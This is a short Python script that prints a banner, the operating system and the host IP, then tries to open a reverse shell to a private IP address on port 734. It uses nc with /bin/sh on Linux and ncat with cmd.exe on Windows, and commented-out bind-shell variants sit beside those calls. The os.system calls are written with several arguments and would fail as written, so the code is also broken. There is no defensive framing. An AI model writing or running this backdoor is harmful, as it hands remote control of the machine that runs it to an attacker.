import platform
import os
import sysconfig
import socket
import fcntl
import struct
import subprocess



def run():
    hostname=socket.gethostname()   
    IPAddr=socket.gethostbyname(hostname) 
    iph= '172.16.32.58'
    print('')
    print(' ############### # # # ##############')
    print(' ####### ###### # #  # # ####### ####')
    print(' ######   ##### ##    ## ######   ###')
    print(' ####### #######  #  #  ######## ####')
    print(' ################ ### ###############')
    print('')
    print('# OS name: ', platform.system())
    if "Linux" in platform.system():
        print('Linux: ', sysconfig.get_platform()) 
        print(' IpAddress: ', IPAddr)
        #os.system( 'nc -lvp 734 -e /bin/sh')
        os.system('nc',iph, '734 -e /bin/sh')
    elif "Windows" in platform.system():
        print('Windows: ', sysconfig.get_platform()) 
        print('Address ip: ', IPAddr)
        #os.system('ncat -lvp 734 -e cmd.exe')
        os.system('ncat', iph ,'734 -e cmd.exe')
    
